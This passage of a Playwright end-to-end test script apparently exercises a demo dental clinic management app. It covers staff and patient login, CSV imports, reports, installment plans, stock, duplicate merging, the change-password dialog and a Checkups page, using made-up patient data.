  await pl.waitForSelector('h1:has-text("Hello, Retry")');
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
  expectErrors(/Failed to fetch/);
});
await step('the same card has a Log out button that leaves the account', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  const made = await makeLoginFor('Logout Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
  await restorePortal();
  // The password was saved before the connection dropped: the new one works and opens the portal directly.
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username);
  await form.locator('input[type=password]').fill('my-own-pass-88');
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Hello, Logout")');
  expectErrors(/Failed to fetch/);
});

await step('Dr. Ali imports a Healthwire transactions export on the Import page', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("1. Payments and invoices")');
  const csv = [
    "Dr. Ali Rashid's Dental Clinic,,,,,,,,,,,,,,,", ',,,,,,,,,,,,,,,', 'Financial Transaction Report,,,,,,,,,,,,,,,',
    'Invoice#,MR#,Patient Name,Patient Phone#,Location,Description,Total,Cash,Discount,Dues,Advance,Mode Of Payment,Created By,Updated By,Discounted By,Payment Date',
    '134006,9556,Import Test One,3355107605,-,Braces First Payment,150000,40000,110000,0,0,Cash ,RJ Mall Clinic,RJ Mall Clinic,,01/08/2026 - 12:36AM',
    '134007,9557,Import Test Two lhr,3001112223,-,"Braces Monthly Payment,brackets",8000,4000,0,4000,0,Debit/Credit Card ,Lahore Gulberg Clinic,Lahore Gulberg Clinic,,05/08/2026 - 06:00PM',
    'Totals:,,,,,,158000,44000,110000,4000,0,,,,,', ''].join('\n');
  await p7.locator('input[type=file]').first().setInputFiles({ name: 'Transactions Report.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('.stat:has-text("Invoices")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Rs 44,000/);
  assert.match(text, /Lahore/);
  await p7.getByRole('button', { name: /Import this file: 2 patients, 2 invoices, 2 payments, 2 visits/ }).click();
  await p7.waitForSelector('.alert:has-text("Invoices: 2 added")');
  assert.match(await p7.locator('.alert').innerText(), /Patients: 2 added/);
});
await step('Dr. Ali imports an Aaj ki List tab: branch and date chosen, visits with doctors land on the patients', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("4. Aaj ki List history")');
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample), Assistant Uzma (sample)",U L 016 Pc refresh,,Done,,',
    ',Hamza Qureshi,8,Monthly,4,Completed,Group 3,Dr Nida,U L 018,,,,Called',
    ',Nobody Here At All,,Checkup,5,Completed,,Dr. Nobody Listed,,,,,',
    ''].join('\n');
  const aaj = p7.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('section[data-tab]');
  await p7.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await p7.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await p7.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  await p7.waitForSelector('button:has-text("Import 3 visits")');
  assert.match(await p7.locator('main').innerText(), /Dr\. Nobody Listed \(1\)/, 'unknown doctor name listed');
  await p7.getByRole('button', { name: 'Import 3 visits' }).click();
  await p7.waitForSelector('.alert:has-text("Visits: 2 added")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Doctors and assistants added to 3 visit slots/);
  assert.match(text, /1 names could not be matched/);
  await p7.goto(BASE + '#/staff/patients');
  await p7.fill('input[type=search]', '9811');
  await p7.locator('table.list tbody tr:has-text("9811") a').first().click();
  await p7.waitForSelector('h2:has-text("Money")');
  const visitText = await p7.locator('main').innerText();
  assert.match(visitText, /20 Aug 2026/);
  assert.match(visitText, /Aaj ki List \(aaj-ki-list-sample\)/);
  await shot(p7, '12-import-healthwire');
});

await step('Dr. Ali adds a treatment on the Clinic setup page and it reaches the sheet dropdown', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  assert.ok((await p7.locator('h2:text("Branches")').count()) && (await p7.locator('h2:text("Doctors and assistants")').count()));
  await p7.locator('section', { hasText: 'Treatments' }).getByRole('button', { name: 'New treatment' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Name').fill('Night guard');
  await m.getByLabel('Default price').fill('15000');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('td:text("Night guard")');
  await p7.goto(BASE + '#/staff/sheet');
  await p7.waitForSelector('#sheet-treatments', { state: 'attached' });
  assert.ok(await p7.locator('#sheet-treatments option[value="Night guard"]').count());
  await shot(p7, '13-clinic-setup');
});

await step('Reports: families and report tabs like the Healthwire financial report', async () => {
  await p7.locator('.topnav .menu:has-text("Reports") > button').click();
  await p7.locator('.topnav .menu-list a:has-text("Financial")').click();
  await p7.waitForSelector('.report-groups .tab[aria-selected="true"]:has-text("Financial")');
  const tabs = (await p7.locator('.report-tabs .tab').allTextContents()).map((t) => t.trim());
  for (const t of ['Transactions', 'Summary', 'Payment mode', 'Procedures', 'Income statement', 'Doctors share', 'Pending payments', 'Advance payments', 'Void invoices', 'Refunds', 'Discounts', 'Statistics', 'Cost per patient']) assert.ok(tabs.includes(t), t);
  await p7.waitForSelector('h2:text("Transactions")');
  await p7.locator('input[aria-label="From"]').fill('2020-01-01');
  await p7.locator('input[aria-label="From"]').dispatchEvent('change');
  await p7.waitForSelector('.report-table tbody tr');
  assert.ok(await p7.locator('.stat:has-text("Received")').count());
  await p7.locator('.report-tabs .tab:has-text("Income statement")').click();
  await p7.waitForSelector('h2:text("Income statement by month")');
  await p7.locator('.report-tabs .tab:has-text("Pending payments")').click();
  await p7.waitForSelector('h2:text("Pending payments by branch")');
  await p7.locator('.report-tabs .tab:has-text("Doctors share")').click();
  await p7.waitForSelector('h2:text("Doctors share")');
  await p7.locator('.report-groups .tab:has-text("OPD")').click();
  await p7.waitForSelector('h2:text("OPD by day")');
  await p7.locator('.report-groups .tab:has-text("Inventory")').click();
  await p7.waitForSelector('h2:text("Stock levels")');
  await p7.locator('.report-groups .tab:has-text("HR")').click();
  await p7.locator('.report-tabs .tab:has-text("Logins")').click();
  await p7.waitForSelector('h2:text("Staff accounts")');
  await p7.locator('.report-groups .tab:has-text("Financial")').click();
  await p7.waitForSelector('h2:text("Transactions")');
  await shot(p7, '14-reports');
});

await step('installment plan: set up on the patient page, overdue shows for the coordinator', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h3:text("Installment plan")');
  await p7.getByRole('button', { name: /Set up a plan|New plan/ }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Total to pay').fill('60000');
  await m.getByLabel('Number of installments').fill('3');
  const past = new Date(); past.setMonth(past.getMonth() - 2);
  await m.getByLabel('First installment due').fill(past.toISOString().slice(0, 10));
  await m.getByLabel('First installment due').dispatchEvent('change');
  await m.getByLabel('Count payments from').fill(past.toISOString().slice(0, 10));
  await m.getByRole('button', { name: 'Save plan' }).click();
  await p7.waitForSelector('.toast:has-text("Installment plan saved")');
  await p7.waitForSelector('.badge:has-text("Overdue")');
  // Take a payment against the oldest unpaid invoice: the form offers the invoice list.
  await p7.getByRole('button', { name: 'Take payment' }).click();
  await p7.locator('.modal').getByLabel('For invoice').waitFor();
  await p7.locator('.modal').getByRole('button', { name: 'Cancel' }).click();
  await p7.goto(BASE + '#/staff/coordinator?tab=reminders');
  await p7.waitForSelector('h2:text("Installments due")');
  assert.ok(await p7.locator('.badge:has-text("Overdue")').count());
  await shot(p7, '15-installments-due');
});

await step('braces off → retainer case with a next check date', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h2:has-text("Braces")');
  await p7.getByRole('button', { name: 'Edit case' }).click();
  await p7.locator('.modal').getByLabel('Case status').selectOption('debonded');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.modal:has-text("start the retainer case")');
  await p7.locator('.modal').getByRole('button', { name: 'Start retainer case' }).click();
  await p7.waitForSelector('.toast:has-text("Retainer case started")');
  await p7.waitForSelector('h2:text("Retainers")');
  await p7.goto(BASE + '#/staff/coordinator?tab=retainers');
  await p7.waitForSelector('th:text("Next check")');
  assert.ok(await p7.locator('input[aria-label^="Next check"]').count());
});

await step('medical history is saved and shown on the patient page', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('button', { name: 'Edit', exact: true }).click();
  await p7.locator('.modal label:has-text("Diabetes") input').check();
  await p7.locator('.modal').getByLabel('Allergies').fill('penicillin');
  await p7.locator('.modal label:has-text("Treatment consent form signed") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('p:has-text("Medical:")');
  assert.match(await p7.locator('p:has-text("Medical:")').innerText(), /Diabetes.*penicillin/);
  assert.ok(await p7.locator('.badge:has-text("Consent signed")').count());
});

await step('Aaj ki List: all branches view and the day download button', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=all');
  await p7.waitForSelector('table.sheet');
  await p7.waitForSelector('th:text("Branch"):not([hidden])');
  assert.ok((await p7.locator('table.sheet tbody tr').count()) >= 1);
  assert.ok(await p7.getByRole('button', { name: 'Download' }).count());
  assert.equal(await p7.locator('.add-panel:not([hidden])').count(), 0);
  await p7.locator('select[aria-label="Branch"]').selectOption({ index: 1 });
  await p7.waitForSelector('.add-panel:not([hidden])');
});

await step('stock: receive and use items, low-stock warning', async () => {
  await p7.goto(BASE + '#/staff/stock');
  await p7.waitForSelector('h2:has-text("Stock ·")');
  assert.ok(await p7.locator('.alert-warning:has-text("reorder level")').count(), 'demo seed has a low item');
  assert.ok(await p7.locator('.reorder-list h2:has-text("Reorder list")').count(), 'reorder list for the supplier');
  assert.ok(await p7.locator('.reorder-list button:has-text("Download for the supplier")').count());
  await p7.locator('.reorder-list ~ section tr', { hasText: '014 NiTi wire' }).getByRole('button', { name: '+ Received' }).click();
  await p7.locator('.modal').getByLabel('Quantity').fill('20');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Stock updated")');
  await p7.waitForSelector('tr:has-text("014 NiTi wire") td:has-text("23 pcs")');
  assert.equal(await p7.locator('.reorder-list tr:has-text("014 NiTi wire")').count(), 0, 'restocked item leaves the reorder list');
  assert.ok(await p7.locator('h2:has-text("Recent moves")').count());
  await shot(p7, '16-stock');
});

await step('edited photo upload is marked for the patient and the website', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Photos and X-rays")');
  await p7.getByRole('button', { name: 'Upload photos' }).click();
  await p7.setInputFiles('.modal input[type=file]', { name: 'after.png', mimeType: 'image/png', buffer: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
  await p7.locator('.modal label:has-text("Edited before/after") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Upload' }).click();
  await p7.waitForSelector('.toast:has-text("uploaded")');
  await p7.waitForSelector('figcaption:has-text("edited (patient sees it)")');
});

await step('duplicate patients: a second record with the same phone is found and merged', async () => {
  // Patient 2 in the demo has phone 03010734521 (i = 1). Register a second record with that number.
  await p7.goto(BASE + '#/staff/patients');
  await p7.getByRole('button', { name: 'New patient' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Full name').fill('Duplicate Test Person');
  await m.getByLabel('Phone number').fill('03010734521');
  await m.getByLabel('Phone number').press('Tab');
  await p7.waitForSelector('.modal .alert-warning:has-text("Possible existing patient")');
  await m.getByRole('button', { name: 'Create patient' }).click();
  await p7.waitForSelector('.toast:has-text("registered as Mr#")');
  await p7.goto(BASE + '#/staff/admin?tab=duplicates');
  await p7.waitForSelector('h2:has-text("03010734521")');
  const group = p7.locator('section.panel', { hasText: '03010734521' });
  assert.ok(await group.locator('td:has-text("Duplicate Test Person")').count());
  await group.getByRole('button', { name: 'Merge into the ticked one' }).click();
  await p7.locator('.modal').getByLabel('I have compared these records').check();
  await p7.locator('.modal').getByRole('button', { name: /^Merge 1 into Mr#/ }).click();
  await p7.waitForSelector('.toast:has-text("Merged:")');
  assert.equal(await p7.locator('h2:has-text("03010734521")').count(), 0);
  await shot(p7, '17-duplicates');
});

await step('"View as patient" shows the record the way the patient sees it', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('link', { name: 'View as patient' }).click();
  await p7.waitForSelector('.alert:has-text("Patient view")');
  assert.ok(await p7.locator('h1:has-text("Hello,")').count());
  assert.ok(await p7.locator('h2:has-text("Invoices and payments")').count());
  assert.ok(await p7.locator('button:has-text("Report / complain")[disabled]').count(), 'complaint button is switched off in the preview');
  await shot(p7, '18-view-as-patient');
  await p7.getByRole('link', { name: 'Back to the record' }).click();
  await p7.waitForSelector('h2:has-text("Money")');
});

await step('sheet filters (doctor, dues, find) and quick-tap treatment details', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=1');
  await p7.waitForSelector('table.sheet tbody tr');
  const total = await p7.locator('table.sheet tbody tr').count();
  await p7.locator('label:has-text("With dues") input').check();
  const withDues = await p7.locator('table.sheet tbody tr').count();
  assert.ok(withDues <= total);
  await p7.locator('label:has-text("With dues") input').uncheck();
  await p7.locator('input[aria-label="Find on this list"]').fill('zzzz-no-such-name');
  assert.ok(await p7.locator('table.sheet tbody td:has-text("No patients")').count());
  await p7.locator('input[aria-label="Find on this list"]').fill('');
  await p7.waitForSelector('table.sheet tbody tr .quick-tap');
  await p7.locator('table.sheet tbody tr .quick-tap').first().click();
  await p7.locator('.modal button:has-text("018")').click();
  await p7.locator('.modal button:has-text("PC")').first().click();
  await p7.locator('.modal').getByRole('button', { name: 'Done' }).click();
  const v = await p7.locator('table.sheet tbody tr').first().locator('input[aria-label^="Treatment details"]').inputValue();
  assert.match(v, /018 PC$/);
});

await step('payment receipt opens from the patient record; WhatsApp link next to the phone', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  assert.ok(await p7.locator('.phone-link a[href^="https://wa.me/92"]').count(), 'WhatsApp link');
  await p7.locator('details summary:has-text("payments")').click();
  await p7.locator('button:has-text("Receipt")').first().click();
  await p7.waitForSelector('.modal .invoice-sheet:has-text("Payment receipt")');
  assert.match(await p7.locator('.modal .invoice-sheet').innerText(), /Received/);
  await p7.locator('.modal .modal-actions').getByRole('button', { name: 'Close' }).click();
});

await step('complaint linked to a doctor shows on that doctor\'s own dashboard with their share', async () => {
  await p7.goto(BASE + '#/staff/complaints');
  await p7.waitForSelector('table.list tbody tr');
  await p7.locator('table.list tbody tr').first().locator('button.link-btn').click();
  await p7.waitForSelector('.modal select[aria-label="About which doctor"]');
  await p7.locator('.modal select[aria-label="About which doctor"]').selectOption({ label: 'Dr. Hina (sample)' });
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.keyboard.press('Escape');
  const pd = await newPage();
  await loginAs(pd, 'Dr. Bushra');
  await pd.goto(BASE + '#/staff/log');
  await pd.waitForSelector('.stat:has-text("Own patients (brought in)")');
  const text = await pd.locator('main').innerText();
  assert.match(text, /Own patients \(brought in\)/);
  assert.match(text, /Your share \(30% of own patients paid\)/);
  assert.match(text, /Complaints about your work/);
  await shot(pd, '13-doctor-dashboard');
  await pd.close();
});

const p6 = await newPage({ width: 390, height: 844 });
await step('sheet works on a phone', async () => {
  await loginAs(p6, 'Front desk \\(Gulshan\\)').catch(async () => {
    await p6.goto(BASE + '#/login/staff');
    await p6.getByRole('button', { name: /Front desk \(Gulshan\)/ }).click();
  });
  await p6.goto(BASE + '#/staff/sheet');
  await p6.waitForSelector('table.sheet tbody tr');
  await shot(p6, '10-sheet-mobile');
});

// ------------------------------------------------------------- change password (account menu and phone drawer)
// The demo has no real passwords: the first current password is accepted whatever it is, the one chosen is remembered for the page.
const pw = await newPage();
const changeDialog = (pg) => pg.locator('.modal');
const changeField = (pg, label) => changeDialog(pg).locator(`.field:has(label:text-is("${label}"))`);
const changeFill = async (pg, current, next, again) => {
  await changeDialog(pg).getByLabel('Current password', { exact: true }).fill(current);
  await changeDialog(pg).getByLabel('New password', { exact: true }).fill(next);
  await changeDialog(pg).getByLabel('Type the new password again', { exact: true }).fill(again);
};
const changeSubmit = (pg) => changeDialog(pg).getByRole('button', { name: 'Change password', exact: true }).click();
const changeOpen = async (pg, { wait = true } = {}) => {
  await pg.locator('.user-menu > button').click();
  await pg.locator('.user-menu .menu-list button:has-text("Change password")').click();
  if (wait) await pg.waitForSelector('.modal h2:has-text("Change password")');
};
await step('staff: "Change password" is in the account menu above "Log out" and opens the dialog with its three fields', async () => {
  await loginAs(pw, 'Front desk \\(Gulshan\\)');
  await pw.locator('.user-menu > button').click();
  const items = (await pw.locator('.user-menu .menu-list button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Change password', 'Log out']);
  await pw.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pw.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pw.locator('.user-menu.open').count(), 0, 'the menu closed behind the dialog');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('autocomplete'), 'current-password');
  assert.equal(await changeDialog(pw).getByLabel('New password', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.equal(await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.match(await changeField(pw, 'New password').innerText(), /At least 8 characters/);
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await changeDialog(pw).getByLabel('Show the new password').check();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 1, 'the box shows the two new passwords as typed');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('type'), 'password',
    'the current password stays hidden (a browser may have filled in a saved one)');
  await changeDialog(pw).getByLabel('Show the new password').uncheck();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await shot(pw, '14-change-password');
  await pw.keyboard.press('Escape');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.evaluate(() => document.activeElement?.closest('.user-menu') !== null), 'focus is back on the account button');
});
await step('empty, short and mismatching entries are refused next to the field, nothing is sent', async () => {
  await changeOpen(pw);
  await changeSubmit(pw);
  for (const label of ['Current password', 'New password', 'Type the new password again']) assert.ok(await changeField(pw, label).locator('.field-error').count(), `${label} says what is missing`);
  await changeFill(pw, 'old-pass-1', 'short', 'short');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /at least 8 characters/);
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-2');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Type the new password again').locator('.field-error').innerText(), /not the same/);
  assert.equal(await changeField(pw, 'New password').locator('.field-error').count(), 0, 'the error is next to the field that is wrong');
  assert.equal(await pw.locator('.toast:has-text("Password changed")').count(), 0);
  assert.ok(await changeDialog(pw).count(), 'the dialog is still open');
});
await step('success: the dialog closes, the toast says what to do next time, and the person stays logged in', async () => {
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  await pw.waitForSelector('.toast:has-text("Password changed. Use the new password next time you log in.")');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.topbar').isVisible());
  assert.match(pw.url(), /#\/staff\//);
  await shot(pw, '15-password-changed');
});
await step('a wrong current password says "not right" next to that field; the same new password is refused; the right current one works', async () => {
  await changeOpen(pw);
  await changeFill(pw, 'wrong-old-9', 'second-pass-22', 'second-pass-22');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Current password').locator('.field-error').innerText(), /not right/);
  assert.ok(await changeDialog(pw).count(), 'still open, nothing changed');
  await changeFill(pw, 'brand-new-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /different/);
  await changeFill(pw, 'brand-new-pass-1', 'second-pass-22', 'second-pass-22');
  await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).press('Enter'); // Enter sends it, like the button
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.toast:has-text("Password changed")').count());
  assert.ok(await pw.locator('.topbar').isVisible(), 'still logged in');
});
const pwPhone = await newPage({ width: 390, height: 844 });
await step('at phone width the drawer shows "Change password" next to "Log out", and the dialog opens from it', async () => {
  await loginAs(pwPhone, 'Front desk \\(Gulshan\\)');
  await pwPhone.locator('.menu-toggle').click();
  await pwPhone.waitForSelector('#staff-drawer.open');
  const items = (await pwPhone.locator('.sidebar-foot button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Change password', 'Log out']);
  await shot(pwPhone, '16-drawer-change-password');
  await pwPhone.locator('.sidebar-foot button:has-text("Change password")').click();
  await pwPhone.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pwPhone.locator('#staff-drawer.open').count(), 0, 'the drawer closed behind the dialog');
  const box = await changeDialog(pwPhone).boundingBox();
  assert.ok(box.x >= 0 && box.x + box.width <= 390, 'the dialog fits the screen');
  await changeFill(pwPhone, 'old-pass-1', 'phone-pass-11', 'phone-pass-11');
  await changeSubmit(pwPhone);
  await pwPhone.waitForSelector('.toast:has-text("Password changed")');
  await pwPhone.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pwPhone.evaluate(() => document.activeElement?.classList.contains('menu-toggle')), 'focus is back on the menu button');
});

// ------------------------------------------------------------- change password: loading, closing, password managers, the phone drawer
const pwLate = await newPage();
const dialogRequests = [];
pwLate.on('request', (r) => { if (/\/js\/ui\/password-dialog\.js/.test(r.url())) dialogRequests.push(r.url()); });
await pwLate.route('**/js/ui/password-dialog.js', async (route) => { await new Promise((r) => setTimeout(r, 1500)); await route.continue(); }); // a slow connection
await step('the dialog code is fetched when the account menu opens, and two clicks while it loads make ONE dialog', async () => {
  await loginAs(pwLate, 'Front desk \\(Gulshan\\)');
  assert.equal(dialogRequests.length, 0, 'not fetched before the menu is used');
  await pwLate.locator('.user-menu > button').click();
  for (let i = 0; i < 20 && !dialogRequests.length; i++) await pwLate.waitForTimeout(50);
  assert.equal(dialogRequests.length, 1, 'fetched as the menu opened, before any click on the item');
  await pwLate.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pwLate.waitForTimeout(200);
  assert.equal(await pwLate.locator('.modal').count(), 0, 'still loading');
  await changeOpen(pwLate, { wait: false }); // the impatient second click
  await pwLate.waitForSelector('.modal h2:has-text("Change password")');
  await pwLate.waitForTimeout(500);
  assert.equal(await pwLate.locator('.modal').count(), 1, 'one dialog, not two stacked ones');
});
await step('the dialog gives password managers the login name, starts on the current password, and warns about other devices', async () => {
  const dialog = changeDialog(pwLate);
  const login = dialog.locator('input[autocomplete="username"]');
  assert.equal(await login.count(), 1);
  assert.equal(await login.inputValue(), 'demo.frontdesk2@example.com');
  assert.equal(await login.getAttribute('readonly'), '');
  assert.equal(await login.getAttribute('aria-hidden'), 'true');
  assert.equal(await login.getAttribute('tabindex'), '-1');
  assert.equal(await pwLate.evaluate(() => document.activeElement?.getAttribute('autocomplete')), 'current-password');
  assert.equal(await dialog.locator('form').count(), 1);
  assert.match(await dialog.innerText(), /other computers or phones, they will be logged out and need the new password/);
});
await step('while the change is being sent the dialog cannot be closed (Escape, the x, a click outside), and says it is working', async () => {
  await pwLate.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const original = state.data.changeOwnPassword.bind(state.data);
    state.data.changeOwnPassword = async (...args) => { await new Promise((r) => setTimeout(r, 1500)); return original(...args); };
  });
  await changeFill(pwLate, 'old-pass-1', 'late-pass-11', 'late-pass-11');
  await changeSubmit(pwLate);
  await pwLate.waitForSelector('.modal[aria-busy="true"]');
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Changing…');
  await pwLate.keyboard.press('Escape');
  await changeDialog(pwLate).getByRole('button', { name: 'Close' }).click();
  await pwLate.mouse.click(4, 4); // the grey area outside
  await pwLate.waitForTimeout(300);
  assert.equal(await changeDialog(pwLate).count(), 1, 'still open while sending');
  await pwLate.waitForSelector('.toast:has-text("Password changed")');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await pwLate.locator('.modal').count(), 0);
});
await step('when the change fails the label is back and the dialog can be closed again', async () => {
  await changeOpen(pwLate);
  await changeFill(pwLate, 'not-the-one', 'again-pass-22', 'again-pass-22');
  await changeSubmit(pwLate);
  await changeField(pwLate, 'Current password').locator('.field-error').waitFor();
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Change password');
  assert.equal(await changeDialog(pwLate).getAttribute('aria-busy'), null);
  await pwLate.keyboard.press('Escape');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
});
// A phone: touch input, so the touch sizes of the stylesheet apply. The admin has the longest menu, so the drawer scrolls.
const pwTouch = await newPage({ width: 375, height: 812 }, { isMobile: true, hasTouch: true });
await step('on a phone the drawer keeps "Change password" and "Log out" on screen, well apart, and "Show the new password" is a full-size tap target', async () => {
  await loginAs(pwTouch, 'Dr. Ali Rashid');
  await pwTouch.locator('.menu-toggle').tap();
  await pwTouch.waitForSelector('#staff-drawer.open');
  const drawer = await pwTouch.locator('#staff-drawer').evaluate((el) => ({ scrolls: el.scrollHeight > el.clientHeight + 1 }));
  assert.ok(drawer.scrolls, 'the menu is longer than the screen, so this checks the sticky foot');
  const change = await pwTouch.locator('.sidebar-foot button:has-text("Change password")').boundingBox();
  const out = await pwTouch.locator('.sidebar-foot button:has-text("Log out")').boundingBox();
  assert.ok(change.y + change.height <= 812 && out.y + out.height <= 812, `both are on screen without scrolling (at ${Math.round(change.y)} and ${Math.round(out.y)} of 812)`);
  assert.ok(out.x - (change.x + change.width) >= 24, 'a slip of the finger on "Change password" does not log out');
  await shot(pwTouch, '17-drawer-sticky-foot');
  await pwTouch.locator('.sidebar-foot button:has-text("Change password")').tap();
  await pwTouch.waitForSelector('.modal h2:has-text("Change password")');
  const row = await changeDialog(pwTouch).locator('label.show-passwords').boundingBox();
  assert.ok(row.height >= 44, `the "Show the new password" row is ${Math.round(row.height)}px tall`);
  await pwTouch.keyboard.press('Escape');
  await pwTouch.waitForSelector('.modal', { state: 'detached' });
});

// ------------------------------------------------------------- the Checkups page (admin), Download Excel, the checkup list import
// (Made-up names and phones only. Each page has its own in-memory demo data: the same page is used from the import to the
// front desk check at the end, and is never reloaded.)
const pk = await newPage();
const rowsOf = (pg) => pg.locator('table.checkup-table tbody tr[data-id]');
const pagerTotal = async (pg) => Number((await pg.locator('.pager-info').innerText()).match(/of ([\d,]+)/)[1].replace(/,/g, ''));
// Branch, the months, Source and Patient file sit behind "More filters" (a closed <details> hides them from the person and from the test).
const moreFilters = async (pg) => {
  const d = pg.locator('details.checkup-more');
  if (!(await d.evaluate((el) => el.open))) await d.locator('summary').click();
};
const openCheckups = async (pg) => {
  await pg.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').click();
  await pg.locator('.topnav .menu-list a:text-is("Checkups")').click();
  await pg.waitForSelector('h1:has-text("Checkups")');
  await pg.waitForSelector('table.checkup-table tbody tr[data-id]');
};
await step('Checkups page: menu entry, 50 rows a page, Next and Previous keep focus, the paging line says "of N"', async () => {
  await loginAs(pk, 'Dr. Ali Rashid');
  await openCheckups(pk);
  assert.match(await pk.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').getAttribute('class'), /current/, 'the Aaj ki List menu stays highlighted');
  const total = await pagerTotal(pk);
  assert.ok(total > 50, `more than one page of checkups (${total})`);
  assert.equal(await rowsOf(pk).count(), 50);
  assert.equal((await pk.locator('.page-head p').innerText()).trim(), `${total.toLocaleString('en-PK')} checkup patients`, 'no leftover "(no patient file, no Mr#)"');
  assert.equal(await pk.getByRole('button', { name: 'Previous' }).getAttribute('aria-disabled'), 'true');
  await pk.getByRole('button', { name: 'Next' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes('Showing 51-'), total);
  assert.equal(await rowsOf(pk).count(), Math.min(50, total - 50));
